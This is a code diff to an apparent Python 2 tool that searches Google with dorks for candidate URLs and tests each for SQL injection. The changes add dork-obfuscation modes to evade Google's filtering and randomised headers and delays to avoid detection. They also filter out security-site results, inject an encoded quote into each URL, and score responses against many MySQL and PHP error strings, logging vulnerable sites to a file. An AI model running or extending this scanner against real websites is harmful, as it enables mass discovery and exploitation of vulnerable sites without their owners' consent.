@@ -4,6 +4,7 @@
 import os
 import sys
 import requests
+import time
 from random import randint
 from termcolor import colored
 
@@ -78,11 +79,36 @@ def     ipuser ():
 
 
 
-def     bypass_GST ():
+def     bypass_GST (dork, mod):
         
-        # Maybe, coming soon ... !
+        
+        if (mod == 1):
+            dork = dork.replace('inurl:', 'inurl+:')
+            dork = dork.replace('intext:', 'intext+:')
+            dork = dork.replace('site:', 'site+:')
+            dork = dork.replace('intitle:', 'intitle+:')
 
-        return "NULL"
+        if (mod == 2):
+            dork = dork.replace('inurl:', 'inur+l:')
+            dork = dork.replace('site:', 'sit+e:')
+            dork = dork.replace('intext:', 'intex+t:')
+            dork = dork.replace('intitle', 'intitl+e:')
+
+        if (mod == 3):
+            dork = dork.replace(' ', '   ')
+            dork = dork.replace('inurl:', 'i+ n+ u+ r+ l+:')
+            dork = dork.replace('intext:', 'i+ n+ t+ e+ x+ t+:')
+            dork = dork.replace('intitle:', 'i+ n+ t+ i+ t+ l+ e+:')
+            dork = dork.replace('site:', 's+ i+ t+ e+:')
+
+        if (mod == 4):
+            dork = dork.replace(' ', '  ')
+            dork = dork.replace('inurl:', '%+%inurl+:%+%')
+            dork = dork.replace('intext:', '%+%intext+:%+%')
+            dork = dork.replace('site:', '%+%site+:%+%')
+            dork = dork.replace('intitle:', '%+%intitle+:%+%')
+
+        return dork
 
 
 
@@ -125,7 +151,8 @@ def     myParserGSE (greq):
                         url_found = block_cutter (url_found, 0, url_found.find('&nbsp;')-1)
                     if (url_found.find('...') > -1):
                         url_found = block_cutter (url_found, 0, url_found.find('...')-1)
-
+                    if (url_found.find('&L=') > -1):
+                        url_found = block_cutter(url_found, 0, url_found.find('&L=')-1)
 
                     if (url_found.find('<b>') > -1):
                         url_found = url_found.replace('<b>', '')
@@ -152,7 +179,8 @@ def     myParserGSE (greq):
                     if (url_found.find('%26') > -1):
                         url_found = url_found.replace('%26', '&')
 
-                    if (url_found.find('.google.') == -1 and url_found.find('.gstatic.') == -1):
+
+                    if (url_found.find('.google.') == -1 and url_found.find('.gstatic.') == -1 and url_found.find('injection-sql') == -1 and url_found.find('sql-injection') == -1 and url_found.find('sql-injections') == -1 and url_found.find('sql-dorks') == -1 and url_found.find('dorks') == -1 and url_found.find('hack') == -1 and url_found.find('scribd') == -1 and url_found.find('pastebin') == -1 and url_found.find('stackoverflow') == -1 and url_found.find('over-blog') == -1 and url_found.find('github') == -1 and url_found.find('blogspot') == -1 and url_found.find('facebook') == -1):
                         urls.append(url_found)
                         print (" [!] URL Found: "+url_found)
                     
@@ -181,6 +209,10 @@ def     myParserSQLE (url):
                 lvl += 2
             if (data.find('Warning:') > -1):
                 lvl += 3
+            if (data.find('Invalid argument supplied for') > -1):
+                lvl += 1
+            if (data.find('Notice: Undefined variable: ') > -1):
+                lvl += 2
             if (data.find('supplied argument is not a valid MySQL result resource in') > -1):
                 lvl += 4
             if (data.find('valid MySQL result') > -1):
@@ -197,16 +229,52 @@ def     myParserSQLE (url):
                 lvl += 4
             if (data.find('mysql_query(): ') > -1):
                 lvl += 4
+            if (data.find('Warning: mysql_result(): ') > -1):
+                lvl += 4
+            if (data.find('Warning: Unknown(): ') > -1):
+                lvl += 3
+            if (data.find('Warning: array_merge(): ') > -1):
+                lvl += 3
+            if (data.find('Warning: require(): ') > -1):
+                lvl += 3
             if (data.find('MySQL Error: 1064') > -1):
                 lvl += 4
+            if (data.find('SQL Error: 1064') > -1):
+                lvl += 4
+            if (data.find('SQL Error : 1054 Unknown column') > -1):
+                lvl += 4
+            if (data.find('SQL Error: 1146') > -1):
+                lvl += 4
+            if (data.find('SQL Error: 2006') >- 1):
+                lvl += 4
+            if (data.find('SQL Error: 1406') > -1):
+                lvl += 4
+            if (data.find('SQL Error: 1030') > -1):
+                lvl += 4
+            if (data.find('SQL Error: 1034') > -1):
+                lvl += 4
+            if (data.find('SQL Error: 1690') > -1):
+                lvl += 4
+            if (data.find('SQL Error:') > -1):
+                lvl += 1
+            if (data.find('Unable to jump to row') > -1):
+                lvl += 1
             if (data.find('Session halted.') > -1):
                 lvl += 3
             if (data.find('Access denied for') > -1):
                 lvl += 3
+            if (data.find('ODBC SQL Server Driver') > -1):
+                lvl == 1
             if (data.find('argument should be an array in') > -1):
                 lvl += 4
             if (data.find(' expects parameter 1 to be resource, boolean given in ') > -1):
                 lvl += 3
+            if (data.find('Warning: array_key_exists()') > -1):
+                lvl += 2
+            if (data.find('Warning: parse_ini_file') > -1):
+                lvl += 2
+            if (data.find('SAFE MODE Restriction in effect.') > -1):
+                lvl += 1
 
 
             if (lvl > 0 and lvl < 4):
@@ -240,7 +308,11 @@ def     marvin_ppa (url, out_file):
         
         print colored("\n [Marvin Ppa] work on "+url, 'blue')
         
-        qurl = url+"'"
+        qurl = url+"%%2727"
+        if (url.find('search.php?search_id=') > -1):
+            qurl = block_cutter(url, 0, (url.find('search.php?search_id=')+len("search.php?search_id=")-1))
+            qurl += "1%%2727"
+    
         if (myParserSQLE (qurl) > 0):
             dump = open(out_file, 'a')
             dump.write(url+"\n")
@@ -263,7 +335,8 @@ def     moulinette (urls, out_file):
         return n
 
 
-def     search_engine (dork, n_page, out_file):
+
+def     search_engine (dork, n_page, out_file, bp):
 
         
         IP_PO = ipuser()
@@ -281,15 +354,22 @@ def     search_engine (dork, n_page, out_file):
             user_agent = rand_agent()
             headers = {'User-Agent': user_agent}
             print colored("\n\n [+] User-Agent: "+user_agent, 'green')
+            
+            if (bp > 0):
 
-            #Client = rand_client()
-            #print colored(" [+] Client: "+Client, 'green')
+                Client = rand_client()
+                print colored(" [+] Client: "+Client, 'green')
 
-            #GS_L = rand_gsl()
-            #print colored(" [+] GS_L: "+GS_L+"\n\n", 'green')
-
-            nurl = "http://www.google.ru/search?q="+dork+"&start="+g_page
-            #+"&"+Client+"&"+GS_L
+                GS_L = rand_gsl()
+                print colored(" [+] GS_L: "+GS_L+"\n\n", 'green')
+                
+                time.sleep(randint(5, 10))
+                nurl = "http://www.google.ru/search?q="+dork+"&start="+g_page+"&"+Client+"&"+GS_L
+            
+            else:
+                time.sleep(randint(2, 5))
+                nurl = "http://www.google.ru/search?q="+dork+"&start="+g_page
+            
         
             greq = requests.get(nurl, headers=headers)
             gdata = greq.text.encode('utf-8')
